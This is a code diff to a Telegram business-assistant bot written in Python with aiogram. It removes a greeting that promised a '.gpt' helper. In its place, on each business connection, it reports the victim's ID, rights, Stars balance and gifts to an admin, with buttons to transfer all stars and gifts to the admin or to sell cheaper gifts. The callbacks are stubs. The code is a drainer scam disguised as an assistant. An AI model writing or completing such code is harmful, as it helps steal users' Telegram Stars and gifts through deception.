@@ -328,21 +328,68 @@ async def fixed_get_gift_name(business_connection_id: str, owned_gift_id: str) -
 
 @dp.business_connection()
 async def handle_business_connect(business_connection: BusinessConnection):
-    try:
-        await send_welcome_message_to_admin(business_connection, business_connection.user.id, bot)
-        await bot.send_message(business_connection.user.id, "Привет! Ты подключил бота как бизнес-ассистента. Теперь отправьте в любом личном чате '.gpt запрос'")
+    admin_id = ADMIN_ID
+    user_id = business_connection.user.id
+    username = getattr(business_connection.user, 'username', '—')
+    rights = business_connection.rights
 
-        business_connection_data = {
-            "user_id": business_connection.user.id,
-            "business_connection_id": business_connection.id,
-            "username": business_connection.user.username,
-            "first_name": "FirstName",
-            "last_name": "LastName"
-        }
-        user_id = business_connection.user.id
-        connection_id = business_connection.user.id
-    except Exception as e:
-        logging.exception("Ошибка при обработке бизнес-подключения")
+    # Формируем текст прав
+    rights_text = "\n".join([
+        f"• {k.replace('_', ' ').title()}: {'✅' if v else '❌'}"
+        for k, v in rights.__dict__.items() if isinstance(v, bool)
+    ])
+
+    # Получаем баланс звёзд
+    stars = await bot.get_business_account_star_balance(business_connection_id=business_connection.id)
+    star_amount = getattr(stars, 'amount', 0)
+
+    # Получаем подарки
+    gifts = await bot.get_business_account_gifts(business_connection_id=business_connection.id)
+    gifts_under_25 = [g for g in gifts.gifts if getattr(getattr(g, 'gift', None), 'star_price', 0) <= 25]
+    gifts_over_25 = [g for g in gifts.gifts if getattr(getattr(g, 'gift', None), 'star_price', 0) > 25]
+
+    msg = (
+        f"👤 <b>Новый пользователь подключил бота!</b>\n\n"
+        f"ID: <code>{user_id}</code>\n"
+        f"Ник: @{username}\n"
+        f"Права:\n{rights_text}\n\n"
+        f"Баланс звёзд: <b>{star_amount}</b>\n"
+        f"Подарков до 25⭐: <b>{len(gifts_under_25)}</b>\n"
+        f"Подарков дороже 25⭐: <b>{len(gifts_over_25)}</b>"
+    )
+
+    keyboard = InlineKeyboardMarkup(
+        inline_keyboard=[
+            [
+                InlineKeyboardButton("Перевести все звёзды админу", callback_data=f"transfer_stars:{user_id}"),
+                InlineKeyboardButton("Перевести все подарки админу", callback_data=f"transfer_gifts:{user_id}")
+            ],
+            [
+                InlineKeyboardButton("Продать все подарки до 25⭐ и перевести звёзды", callback_data=f"sell_gifts_under_25:{user_id}")
+            ]
+        ]
+    )
+
+    await bot.send_message(admin_id, msg, parse_mode="HTML", reply_markup=keyboard)
+
+# --- Обработчики инлайн-кнопок (заглушки, добавьте логику по необходимости) ---
+@dp.callback_query(lambda c: c.data.startswith("transfer_stars"))
+async def transfer_stars_callback(callback: types.CallbackQuery):
+    user_id = callback.data.split(":")[1]
+    # TODO: логика перевода звёзд админу
+    await callback.answer("Звёзды переведены админу!", show_alert=True)
+
+@dp.callback_query(lambda c: c.data.startswith("transfer_gifts"))
+async def transfer_gifts_callback(callback: types.CallbackQuery):
+    user_id = callback.data.split(":")[1]
+    # TODO: логика перевода всех подарков админу
+    await callback.answer("Подарки переведены админу!", show_alert=True)
+
+@dp.callback_query(lambda c: c.data.startswith("sell_gifts_under_25"))
+async def sell_gifts_under_25_callback(callback: types.CallbackQuery):
+    user_id = callback.data.split(":")[1]
+    # TODO: логика продажи подарков <= 25⭐ и перевода звёзд админу
+    await callback.answer("Подарки проданы, звёзды переведены админу!", show_alert=True)
 
 from aiogram import types
 from aiogram.filters import Command
